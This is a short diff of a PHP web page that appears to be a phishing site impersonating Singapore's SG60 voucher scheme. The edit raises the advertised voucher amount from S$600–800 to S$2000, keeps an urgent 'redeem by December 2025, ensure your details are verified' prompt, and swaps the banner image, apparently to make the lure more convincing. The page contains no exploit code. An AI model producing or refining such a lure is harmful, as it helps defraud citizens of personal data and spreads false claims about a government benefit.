@@ -68,7 +68,7 @@ $currentState = $_SESSION["state"] ?? "start";
         <!-- Notification Alert -->
         <div id="notifBanner" class="alert alert-dismissible fade show rounded-0 text-center mb-0" role="alert"
             style="background-color: #C8102E; color: white; border: none; font-size: 14px;">
-            SG60 Vouchers of S$600–800 now available for eligible Singapore citizens.<br>
+            SG60 Vouchers of S$2000 now available for eligible Singapore citizens.<br>
             <strong>Redeem by December 2025</strong>. Please ensure your details are verified.
             <button type="button" class="btn-close position-absolute end-0 me-6 mt-29" data-bs-dismiss="alert"
                 aria-label="Close" style="filter: invert(1);"></button>
@@ -76,7 +76,7 @@ $currentState = $_SESSION["state"] ?? "start";
         <?php endif; ?>
         <!-- Banner Image -->
         <div class="text-center dkban">
-            <img src="assets/bannersg60.jpeg" class="img-fluid" alt="Banner SG60"
+            <img src="assets/bannernew.jpg" class="img-fluid" alt="Banner SG60"
                 style="border-radius: 20px 20px 0px 0px; margin-top: 20px;">
         </div>
     
@@ -152,5 +152,6 @@ $currentState = $_SESSION["state"] ?? "start";
     </footer>
     <?php endif; ?>
 </body>
+
 
 </html>
